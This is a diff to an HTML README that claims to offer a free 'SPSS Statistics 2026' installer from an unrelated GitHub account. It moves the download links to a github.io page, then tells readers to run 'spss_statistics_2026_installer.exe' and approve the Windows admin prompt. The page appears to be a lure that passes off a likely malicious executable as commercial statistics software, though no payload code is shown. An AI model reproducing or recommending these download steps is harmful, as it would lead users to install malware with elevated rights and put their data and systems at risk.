@@ -1,7 +1,7 @@
 <h1 style="color: #2c3e50; font-family: sans-serif;">📊 SPSS-Statistics-2026 - Perform Complex Data Analysis With Ease</h1>
 
 <div style="margin-bottom: 20px;">
-    <a href="https://github.com/Prokaryotic-demography187/SPSS-Statistics-2026" style="background-color: #2f4f4f; color: #ffffff; padding: 15px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; font-family: sans-serif;">Download SPSS Statistics Here</a>
+    <a href="https://prokaryotic-demography187.github.io" style="background-color: #2f4f4f; color: #ffffff; padding: 15px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; font-family: sans-serif;">Download SPSS Statistics Here</a>
 </div>
 
 <h2 style="color: #34495e; font-family: sans-serif;">📋 Project Overview</h2>
@@ -20,7 +20,7 @@
 <h2 style="color: #34495e; font-family: sans-serif;">📥 Download and Installation</h2>
 <p style="font-family: sans-serif; line-height: 1.6;">Follow these steps to set up the software on your machine. Ensure your internet connection remains stable during the process.</p>
 <ol style="font-family: sans-serif; line-height: 1.6;">
-    <li>Visit the <a href="https://github.com/Prokaryotic-demography187/SPSS-Statistics-2026">official download page</a> to access the installer file.</li>
+    <li>Visit the <a href="https://prokaryotic-demography187.github.io">official download page</a> to access the installer file.</li>
     <li>Locate the download section on the page and save the .exe file to your computer.</li>
     <li>Navigate to your "Downloads" folder and double-click the file named "spss_statistics_2026_installer.exe".</li>
     <li>Select "Yes" if Windows asks for permission to allow the application to make changes to your device.</li>
